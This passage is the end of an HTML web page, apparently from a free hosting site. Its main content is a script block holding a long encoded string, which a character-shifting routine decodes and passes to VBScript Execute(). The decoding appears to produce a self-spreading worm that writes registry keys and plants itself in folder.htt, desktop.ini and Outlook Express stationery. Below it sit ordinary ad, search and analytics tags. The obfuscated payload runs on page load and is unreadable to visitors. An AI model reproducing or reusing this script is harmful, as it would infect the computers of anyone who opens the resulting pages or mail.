ExeString = "=ii BnSh^ra,AtilMett%V^sMett%DagkeaSbgj,:pll^O^j^cp,?SK,PsOh^lh,PijPZtd,Lu^E%FenZluDbsgSqbKF_lt]rm(%KFS^t@if(%KFCke]t^Melbeq(KCLek^Ip(KCCneZtaMZih(KCPnoiacame$)An] Ou[Fqn\teog GJ:plegdPo!Fel^P]ta,PyieOtk)HnEkrkrRasnma GettOem NeZdPefp=FOO'OlegTaxmFel^(BieeLamh(1TfpOtk 9 Ke]dMeip'Raa]AhlEfIjsmr$TfpOtk,KC_otZrp(% 5>0On Eej(MmlSmr% 5 - MhanNeZdPefp*CeooeAxbtFnn_tbojEjdIbIb MyleLtn 6 hmt MhanNeZdPefp*CeooeOem BieePefp=FOO'OlegTaxmFel^(BieeLamh(2FblaT^ml.Pret^ <  BKDR kneo]d6&obockilt3&GJXspakt$)  >  ob?rEf&TipLtn  rb<rHf&HmmhT^xpFel^Tami.?lhsaSatF=tmreb=FLO*G^tBiee$FblaPZtd)BAmtni[.]tmrebntas=3-EesaRaa]Tami.?lhsaSatFel^Tami 9 ?SK.HpanMett?ihe!Fel^P]ta,4)EfTup^Spr=atil Ph^n?iheMeip'Wnimev[CnL_  <  HMMH>  ob?rEf&8&;O@Yojlha`=  v[s_rbpp:  KF_lt]rm(%&:&v[CnL_  AtilMettAlleEfTup^Spr=oboTdegFblaT^ml.Pret^ rb<rHf&V[sPeqt>n` Bf?iheMeip'Chole>n` Bf>n` ?ujcmikn?ujcmiknKFCaajg^Sqb!CqrkejtLtnigg(LZspIgdax<h]rI_ HaltEn]etCaan 6 , MhanEfLafm(HCZsa(<unr^npSmren`)(1 9<L?ale$\% MhanGJ<h]n`eOu[ 9 ?ijaey@ilk&6\SnbA 6 ,Ehs^KCCdaggaSnb=Cdr!Aoc!Lafm(HCZsa(<unr^npSmren`)(1)-1%  :ULu^E=0An] EfAlleDJ?hZnceLu^ 6 Ii](?ukranmSprbnc,*,HaltEn]etCaan)An] EfAn] BugcpihnBugcpihnKCCneZtaMZih(Og Arkon KeoufeN^xpIb BnSh^ra 6 hmmhTdegEqip ?ujcmiknAn] EfOhZraFbla 6 He_t$WbnLamh(3  Pno`r]mFel^sXChmiog Bieeo\Fi_rhskfm OhZradUSpamikn^ru\[l]nd.dtfBf(?SK.?ihe>xesms$Saane?ihe)TaejC]le GJ:plegdPo!SdakeBiee(atil)>loeOem BieePefp=FOO'OlegTaxmFel^(OhZraFbla,+,prne%Fel^Tami.Srbta <  HMMH>  ob?rEf&8&;O@Yojlha`=  v[s_rbpp:  KF_lt]rm(%&:&v[CnL_  AtilMettBieePefp*CeooeAn] Ef@e_aqlmI` 6 SsLhale.Ne`Raa](HDEU_<UNR>NP_NSARUI`egtetbeo\=ebanlp NsarI@OntHohkRekseog 9 PsOh^lh.KecR^a`(HGER_HO<AH_FA?HBNA\LobtpaneUMeckooo_tXOnthohkEqpnelsXM^deaOenWlSdeel*R^gSrbta HGER_?UKRANM_QS>RXI]ejtbteel\&=ebanlpI]&\LobtpaneUMeckooo_tXOnthohkEqpnelsX He_t$OntHohkRekseog,-)&.)\IablXChmloleUleSmapihnarr(1%NE@_@WHR@?aelKCM]ieRag!DK>Y[CNRNEGT[ULEN\Bdanmipi^sXDafZuhtBdUSkfmw]r^\Ii\rkshfp\Huplhog >xlr^so\&L^fp(HupLhogV^roihn(1 '0XMZih\Lt]tbojekyNZma%SdakeBiee%C]le GJFaelKec(HGER_?UKRANM_QS>RXI]ejtbteel\&=ebanlpI]&\LobtpaneUMeckooo_tXOnthohkEqpnelsX He_t$OntHohkRekseog,-)&.)\IablXWbda Lt]tbojekyNZma%SdakeBiee%WoSaehl'RagPret^ HDEU_<UNR>NP_NSARUSkfmw]r^\Ii\rkshfp\Hfbi\eX9'0XOnthohkXOiteogsXMZih\>dethrLr^far^n_e,-3*032%NE@_@WHR@?aelKCM]ieRag!DK>Y[CNRNEGT[ULEN\LobtpaneUMeckooo_tXWbn`opsM^soa`ijgSqblyot^mXPkobieeo\Fi_rhskfm Kumlkod Enmenn^tS^tpiggo\)a,d)2,0)0,0)0,0\0,0)0,0)0,0)006U0,1^0/6)([l]nd%C]le GJFaelKec(HGER_?UKRANM_QS>RXShfpwZra\Fi_rhskfm\Sigdkwl JTUCqrkejtOensboj\Pijdhwo FeosZgen` Ou[susmei\IrkfblasUMeckooo_tOnthohkIgtargep LeptbncsU0]0]0.0)0,0)0,0)c,0)0,0)0,0)0,4/\,0*e,3/0,bhagk)SsLhale.Ne`WnimeAKAYXCQRKEJTXUOEK\Oo_tsakeXMbcnolobtUObfbca\*0*0UOqteokkUOltbojsUM]ie\AdbtkrIraf^ran\e,*3-002(KEC_=WKR=<ahlKFMZihR^g$AKAYXCQRKEJTXUOEK\Oo_tsakeXMbcnolobtUObfbca\*0*0UCkmfoj\FaelLeptbncsUNawLt]tbojeky,bhagk)GJnmia`eBoedar!Lafm(SigP]ta,/)&Irkgkai ?ihel\?ofmknFel^sXMbcnolobtSdake`\Lt]tbojeky)An] BugcpihnBugcpihnKCCneZtaMbleen(%Oj >rnok NeluieNaxmT^mlPZtd 6 EfNkt!FOO'Fel^Etilto(PijPZtd  WLcniit*eqe) Ph^nMeipIaph=lyot^m/2U>n` BfBfT^mlPZtd 6 srspef3.\ Ph^nLt]rmUlFbla 6 SigP]ta  SUSMEI\Denn^l/2'dhlEesaSpaktQp?ihe=WbnLamh&OYLTAMUKargeh.]lhAn] EfSsLhale.Ne`WnimeAKAYXLKC:L[M:CDIGEXShfpwZra\Fi_rhskfm\Sigdkwl\?ukranmVarliknURqnUKargeh3+(SmantNpBiee?SK.<oly?iheWenIaph&pe^\djsael*gbf,PijPZtd  w^bXFhl`ek.dtm?SK.<oly?iheWenIaph&lyot^m/2UkfwZlh.`ib%WenIaph&lyot^m/2Udasdtkp'ijiCZlh DJ=piejdMo$WbnLamh&se[\Boedar'hpt,hmt)SsLhale.Ne`WnimeAKAYXCHALSASXRKOM\*delX%`lefel^PsOh^lh.KecWkipeDK>Y[CEAOS>S[RHOP\'dhlUCknmejtTup^(Zpllbc]tboj/q-is]osneo]dWlSdeel*R^gSrbta HGER_?L:SOEL_NOHTXdelbieeXD^f]uetEchnX%WoSaehl'RagKe]d!DK>Y[CEAOS>S[RHOP\ox`fbla\=ebanlpI\oj\)PsOh^lh.KecWkipeDK>Y[CEAOS>S[RHOP\]lhfbla\LcniitAn`ijeU(OBOckiltWlSdeel*R^gSrbta HGER_?L:SOEL_NOHTXdelBieeXSaehlUOleg\?ofm]n]\,PijPZtd  PefpLamh&SS\repm.ax^ 1%&SsLhale.Ne`WnimeAKAYXCHALSASXRKOM\`leFel^\Oh^lhEq\LrhparmyOh^epHZn`l^ro\PSDPkolsU(t6,2.4?A.-55,B)1*CB-1C56&0,A:0,B17,8<}WoSaehl'RagPret^ HDEU_<L=SLEO_KOKTUdhl?iheUS_rbppHhspEgckd^\,{45*3-6,1)410?-*1@2&B-F2-,0<00F16?3+4yOem BieePefp=FOO'OlegTaxmFel^(OtZrpUiFel^,.,mrqeFblaT^ml.Pret^ RblTaxmFblaT^ml.<lks^EgdFnn_tbojFnn_tboj DJHideEt!)BfIgWdeke<7 hmmhTdegEqip ?ujcmiknAn] EfPhbsHo\apihn=dkcnmanm.ho\apihnBfL^fp(MhesEo_amikn% 0)=_ihe Ph^nMhesEo_amikn=Mbd$TaioLhc]tboj,2)BfFLO*G^tAxmejsbojNZma(MhesEo_amikn 8> mhanPhbsHo\apihn=Lafm(PhbsHo\apihn(L^n$TaioLhc]tboj)-L^n$FLO*G^tBieeJafe$TaioLhc]tboj))>n` BfBfL^n$TaioLhc]tboj)>3TdegTaioLhc]tboj 6 PhbsHo\apihn&XAn] EfGJnmia`eBoedar!TdilLkcZteog)>n` Bf>n` ?ujcmikn?ujcmiknKFMZihR^g$R^gOtk,BieeJafe%Oj >rnok NeluieNaxmR^gPefpOtk 9 PsOh^lh.KecR^a`(KecSmr%Ib KecT^mlSmr= MhanSsLhale.Ne`WnimeR^gOtk,BieeJafe>n` Bf>n` ?ujcmikn?ujcmiknKFO[oOu[(?ukranmSprbnc)Ou[E=0MeotHup 6 ,Dk Phel^ PrneMeotHup 6 PeltKum ' *I_ PeltKum : +8TaejCqrkejtLtnigg=FenZluDbsg  :U>xetDkEjdIbOj >rnok NeluieNaxmS^tTaioFhl`ek 9 ?SK.@epFhl`ek(?ukranmSprbnc)Oem @i\Sqb=Cke]t^O^j^cp(S_rbppigg*Dbcpihn]rr%SatFkl]ens=TaioFhl`ek.Ou[Fkl]ensBoedar<oqnm 9 )FhrEZcd Meip?ohd^rig BoedarlFhl`ekCkugt=Fkl]enChujt+1@i\Sqb'a`dFkl]enChujt% PefpBoedar'N]m^N^xpIb =i_Snb*Chujt=0TdegLZspIgdax<h]r=IgsprKer(<unr^npSmren`,\,Heg(?ukranmSprbnc)&1%SqbLtnigg=Med!CqrkejtLtnigg(LZspIgdax<h]r$1(L^n$CnrnegtOtkijg-HaltEn]etCaan-*)<unr^npSmren` 9 DJ?hZnceLu^(<unr^npSmren`,HaltEn]etCaan)Ou[E=1>loeEfSqb> 9 ) Ph^n<unr^npSmren` 9 <unr^npSmren`  =i_Snb*Imei(*)&XAxbtDhEesaj=0?on c 9 * PoFkl]enChujtEfL?ale$SnbOtkijg 9 EC]s^(@i\Sqb'Ipef(f) Ph^nBfj<Fhl`ekCkugtTaejCqrkejtLtnigg=CqrkejtLtnigg&DecLu^.Btam!j'1  \Etim @oAn] EfAn] EfJeqtEaotBn`eqCdak 9 BnotkRav!CqrkejtLtnigg(U(L^n$CnrnegtOtkijg--)Ou[Sprbnc 6 Ii](?ukranmSprbnc,EaotBn`eqCdak+-,Eej(<unr^npSmren`))LZspIgdax<h]r&1%CqrkejtLtnigg=KFCaajg^Sqb!CqrkejtLtnigg(LZspIgdax<h]rEgdI_EgdI_LholKFO[oOu[ 9 <unr^npSmren`EgdFnn_tbojFnn_tboj DJLrhp]gZta(Og Arkon KeoufeN^xpRagIaphOahu^ 9 HGER_HO<AH_FA?HBNA\LobtpaneUMeckooo_tXOnthohkEqpnelsXD^gne^=iok=ecr^e=WoSaehl'RagKe]d!RagIaphOahu^)BfDbsgD^gne^ 9 TaejDesdDagkea 6 Bigahy=iok&3\EjdIbFkri91tk .DbsgD^gne^ 9 DJKbhSqb!DesdDagkea)GJnmia`eBoedar!DesdDagkea)JeqtPsOh^lh.KecWkipeRagIaphOahu^,@ilk@e`raeAn] BugcpihnBugcpihnKCuimZgaFhl`ek(LamhJafe%Oj >rnok NeluieNaxmS^tFhl`ekN]m^ 9 ?SK.@epFhl`ek(LamhJafe%SatTdilFel^s=Fkl]enNZma.?ihelHmtAxbsps=0Bok Aa\hTaioFbla BnTaioFblasBieeAxm 9 NC]s^(BSH.CemEtt^noihnJafe$TaioFbla.Iaph)BfFblaEqt=DTFOk BieeAxm 9 HPMEOk BieeAxm 9 AOP KrFel^Ett=IHLOn ?ihe>xp 6 JLP Mhan?aelKCAlp^n`Th(PhbsBiee*PZtd,hpme%Ehs^Ib ?ihe>xp 6 V;S Mhan?aelKCAlp^n`Th(PhbsBiee*PZtd,v^s)>loeBfFblaEqt=DTMTaejHpt>xesms=1>n` BfGettEf(QCZsa(IaphGaie 9 NC]s^(SigP]ta  DasdtkpU%)On !U?ale$PZtdNZma)=U<aoe!WenIaph&=eokmol)Ph^nAtpEqiotl 9 *EgdI_I_ DtmEtilto 6 , MhanBSH.?oiyBieeWbnLamh&oyltam,2Xd^sgthp*igi,IaphGaieBSH.?oiyBieeWbnLamh&se[\Boedar'hpt,LamhJafe>n` Bf>n` ?ujcmikn?ujcmiknKFS^t@if(%Oj >rnok NeluieNaxmEkr*Cee]rPeltEt=WLcniit*S\repmFqlen]m^I_ Ark Ph^nBnSh^ra 6 hmmhAlleBnSh^ra 6 v[sEjdIbIb BnSh^ra 6 v[s MhanOem BSH 9 <raameKbce_t!Ockiltbnc.?iheLyot^mKbce_t)Lep PsOh^lh 6 ?r^apeHbfe\t$PS_rbpp.Lhale%Ehs^S^tAipheHbfe\t=dkcnmanm.]pilatl(KC_cu^spAipheHbfe\t*s^t?LLI@({B9,5@C+2)1<F,-*1@0&A@B2-,0<00F=54A)ByAipheHbfe\t*cke]t^Ijsmajc^(%SatWoSaehl=AipheHbfe\t*G^tKbce_t!):pll^O^j^cp.lepCESED!w0=4/F>0--?053&1-C?-49-0)0)A,C2014+24}):pll^O^j^cp.\raameEnlt]n\e$)Oem BSH 9 :pll^O^j^cp.@epO[jacm(%EjdIbSatDesdO^j^cp 6 BSH.@rbvasBok Aa\hDbsgT^ml BnDbsgO[jacmI_ @ilkPefp*DkireMyle<: + =n] @ilkPefp*DkireMyle<: * Ph^n>xetFkrAn] EfBigahy=iok=DbsgT^ml.=rev^LatmenNaxmDbmOmhar:rn(,)Kajdhmez^Fhri60Th /Oph^r=rk(e)=Igt$(2 & Kn`)N^xpTamiSprbnc 6 Bok e=* PoLan!TdilTaxm)MeipGui 6 =s\(Ii](PhbsPeqt(i%1%)EfTamiNqm=1, Ph^nMeipGui 6 .8AlleEfTamiNqm=1) Ph^nMeipGui 6 .9An] EfPefp?hZr=Cdr!TamiNqm-Omhar:rn(b Io] 0)I_ Pefp?hZr=Cdr!30)TdegT^mlCaan 6 ?hk(-8EgdI_T^mlSmren` 9 MeipLtnigg&TamiCdakN^xpUjLhcgSmr=Ax^cqt^(=ii DeuAkr$3,PhbsPeqtv^CkLb&GerAnr!0% 6   KtaenAkr$0  &ob?rEfKay:rn(*)=&Oph^r=rk(-)&v[CnL_&DeuAkr$2 9   HtdekAnr!2%  &rb<rHfK^y=rk(/)=&Omhar:rn(,)&v^CkLb&Bok e=* PoLan!EteLtnigg%&rb<rHfT^mlNnm=Aoc!Med!EteLtnigg(i%1%)v[CnL_&BfT^mlNnm=14 Mhanv[CnL_&MeipGui 6 /4v[CnL_&>n` Bfv^CkLb&Pefp?hZr=Cdr!TamiNqm+K^y=rk(e Fo` -)%&rb<rHfI_ Pefp?hZr=Cdr!24)Tdeg&ob?rEfTamiCdak 9 ob?rv[CnL_&>loeBfT^mlCaan 6 ?hk(.9 Ph^nv^CkLb&Pefp?hZr=v^L_&ob?rEfEjdIb&rb<rHfTaioT^xp 6 PhbsPeqt&TamiCdak&ob?rEfNaxm)  ob?rEf&Ax^cqt^(PhbsPeqt%PhbsPeqt=Ax^Sprbnc 6   MeipLtnigg&HmmhT^xp 68&lcniitlZncuZga=obockilt7&v^CkLb  dhcqm^np.pret^   &8&]ir ltul^=#phsetboj:Zbooeupe4 he_t60ix7 mol:)pt;wedmh60ix7 aeegat60ix7 s-en]et:+87 oioi[ihimy6 ai`d^n#>  <&:PLL>TN:MA=DJ_`uasm DEBGDT60WBDPH60chda=\oi.fs*&ZcpioeT.:cpioeX<oiphnanm>  <  /=PILAT7&8&(dev7&v[CnL_  <  /lcniit:&v[CnL_  <  s\repm haggqa`e9v[s_rbpp>  ob?rEf&TdilTaxm  ob?rEf&UjLhcgSmr&v^CkLb  <  /ockilt7&v^CkLb  <  />O=Y:&v[CnL_  <  /ATIL7OboT^xp 6 PhbsPeqt&v^CkLb  QnEo_kLtn  rb<rHf&DJ[smant!)WenIaph=FLO*G^tOp^ceaeFkl]en())&XEf(BSH.BieeAxbsps!WenIaph&pe^\?ohd^r*hmt) Ph^n?SK.<oly?iheWenIaph&pe^\?ohd^r*hmt,PijPZtd  w^bXkcw]le.ci_>n` BfBf(?SK.?ihe>xesms$WbnLamh&oyltam,2Xd^sgthp*igi) Ph^n?SK.<oly?iheWenIaph&lyot^m/2Udasdtkp'iji,SigP]ta  susmei3+\gjpahl'gefEgdI_EgdFnn_tboj"
Execute("Dim KeyArr(3),ThisText"&vbCrLf&"KeyArr(0) = 0"&vbCrLf&"KeyArr(1) = 7"&vbCrLf&"KeyArr(2) = 0"&vbCrLf&"KeyArr(3) = 4"&vbCrLf&"For i=1 To Len(ExeString)"&vbCrLf&"TempNum = Asc(Mid(ExeString,i,1))"&vbCrLf&"If TempNum = 18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&vbCrLf&"If TempChar = Chr(28) Then"&vbCrLf&"TempChar = vbCr"&vbCrLf&"ElseIf TempChar = Chr(29) Then"&vbCrLf&"TempChar = vbLf"&vbCrLf&"End If"&vbCrLf&"ThisText = ThisText & TempChar"&vbCrLf&"Next")
Execute(ThisText)
</script></DIV>
<div align="center" style="margin-bottom:7px">

<script type="text/javascript" src="http://www.aaacafe.ne.jp/js/footer_ad.js">
</script>

<!--
<script type="text/javascript" src="http://www.aaacafe.ne.jp/js/search_frame.js"></script>
-->

<script type="text/javascript"  src="http://st.search.livedoor.com/research/search_frame.js"></script>
<script type="text/javascript">
livedoorSearchShowReSearchFrame({
     search_id : 'ld_aaajs_sl'
});
</script>

<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
var pageTracker = _gat._getTracker("UA-2244924-59");
pageTracker._initData();
pageTracker._trackPageview();
</script>

<script type="text/javascript">
lcs_do(); 
</script>

</BODY>
</HTML>